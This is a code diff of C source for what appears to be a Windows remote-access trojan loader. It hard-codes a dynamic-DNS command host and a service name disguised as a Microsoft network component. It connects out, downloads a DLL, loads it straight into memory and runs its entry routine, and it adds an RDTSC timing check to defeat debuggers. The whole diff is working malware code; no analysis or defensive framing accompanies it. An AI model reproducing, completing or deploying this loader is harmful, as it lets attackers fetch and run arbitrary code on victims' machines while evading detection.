@@ -14,33 +14,33 @@
 
 unsigned long _stdcall resolve(char *host)
 {
-    struct hostent *ser = NULL;
+	struct hostent *ser = NULL;
 	
 	long i = inet_addr(host);
 	
-    if (i < 0) //Not Ip
-    {
+	if (i < 0) //Not Ip
+	{
 		ser = (struct hostent*)gethostbyname(host);
 		
-        if (ser == NULL)
-        {
+		if (ser == NULL)
+		{
 			ser = (struct hostent*)gethostbyname(host); //retry
-        }
+		}
 		
 		if (ser != NULL)
-        {
+		{
 			return (*(unsigned long *)ser->h_addr);
-        }
+		}
 		
 		return 0;  
-    }
+	}
 	
-    return i;
+	return i;
 }
 
 struct MODIFY_DATA
 {
-    char  strIPFile[128];   //ip文件or DNS						0
+	char  strIPFile[128];   //ip文件or DNS						0
 	char  strVersion[16];   //服务端版本						128
 	DWORD dwVipID;          //VIP ID							144
 	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
@@ -51,64 +51,69 @@ struct MODIFY_DATA
 	int   ServerPort;		//Client port						481
 } modify_data =
 {
-    "botovinik.vicp.net:80",
+	"botovinik.vicp.net",
 	"150706",
 	405,
 	FALSE,
 	"WinNetCenter",
 	"Microsoft(R) Multi Protocol Network Control Center",
-	"Provides supports for multi network Protocol. This service can't be stopped.",
+	"Provides supports for multi network Protocol. This service can not be stopped.",
 	"127.0.0.1",
 	80
 };
-
-SOCKET MainSocket;
 
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
 	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
 	
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family = AF_INET;
-    LocalAddr.sin_port = htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);
+	struct sockaddr_in LocalAddr;
+	LocalAddr.sin_family = AF_INET;
+	LocalAddr.sin_port = htons(modify_data.ServerPort);
+	LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);
 	
-    MainSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
+	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
 	
 	int timeout = 45000;
-	int err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+	int Err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 
-    if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-        DbgErr("Can't Connect to Dll Server");
+	if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
+	{
+		DbgErr("Can't Connect to Dll Server");
 #ifndef DE
 		Sleep(30000);
 #endif
-        return 0;//connect error
-    }
-    else
-    {
-        TurnonKeepAlive(MainSocket, 120);
-    }
+		return 0;//connect error
+	}
+	else
+	{
+		TurnonKeepAlive(MainSocket, 120);
+	}
 	
-    MsgHead msgHead;	
-    msgHead.dwCmd = SOCKET_DLLLOADER;
-    msgHead.dwSize = 0;
+	MsgHead msgHead;	
+	msgHead.dwCmd = SOCKET_DLLLOADER;
+	msgHead.dwSize = 0;
 
-    if (!SendMsg(MainSocket, NULL, &msgHead))
-    {
-        DbgErr("Loader Request Can't Send");
-        closesocket(MainSocket);
-        return 1; //send socket type error
-    }
+	if (!SendMsg(MainSocket, NULL, &msgHead))
+	{
+		DbgErr("Loader Request Can't Send");
+		closesocket(MainSocket);
+		return 1;
+	}
 
-	char *buf = (char *)VirtualAlloc(512 * 1024);
+	if(!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead)))
+	{
+		DbgErr("Can't Recv Dll Data Head");
+		
+		return 1;
+	}
 
-	if (!RecvMsg(MainSocket, buf, &msgHead))
+	char *buf = (char *)VirtualAlloc(msgHead.dwSize);
+
+	if (!RecvData(MainSocket, buf, msgHead.dwSize))
 	{
 		DbgErr("Can't Recv Dll Data");
 		
-		return 0;
+		return 1;
 	}
 	
 	shutdown(MainSocket, 0x02);
@@ -119,26 +124,30 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 		HMEMORYMODULE hModule;
 		
 		hModule = MemoryLoadLibrary(buf);
-		VirtualFree(buf, 256*1024);
+		VirtualFree(buf, msgHead.dwSize);
 
 		if (hModule == NULL)
 		{
-			DbpErr(_T("Load Dll Err"));			
+			MsgErr(_T("Load Dll Err"));			
 			
-			return 0;
+			return 2;
 		}
 		else
 		{
 			typedef BOOL (*_RoutineMain)(LPVOID lp);
 			
 			_RoutineMain  RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
-			//DbgErr("ADDR:%p", (DWORD)RoutineMain);
-			RoutineMain(0);
+			Err = RoutineMain((LPVOID)&modify_data);
 			MemoryFreeLibrary(hModule);
 		}
 	}
+	else
+	{
+		VirtualFree(buf, msgHead.dwSize);
+		return 2; //Recv Msg is not a dll info
+	}
 
-	return 0;
+	return Err;
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance,
@@ -164,8 +173,8 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	UpdateWindow(hwnd);
 
 	_asm
-    {
-        RDTSC
+	{
+		RDTSC
 			xchg    ecx, eax
 			RDTSC
 			sub     eax, ecx
@@ -174,7 +183,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 			xor     eax, eax
 			push    eax
 			call    ExitProcess
-    }
+	}
 OK:
 
 	GetInputState();
@@ -187,14 +196,19 @@ OK:
 	{
 		__try
 		{
-			ConnectThread(NULL);
+			MsgErr("Exit before");
+			if ( ConnectThread(NULL) == -1)
+			{
+				MsgErr("Exit");
+				WSACleanup();
+				return 0;
+			}
+			MsgErr("Exit after");
 		}
-		__except(1)
+		__except (1)
 		{
-			ErrMsg(_T("Sys Err"));
+			MsgErr("Except");
 		}
-		
-		Sleep(5000);
 	}
 	
 	WSACleanup();
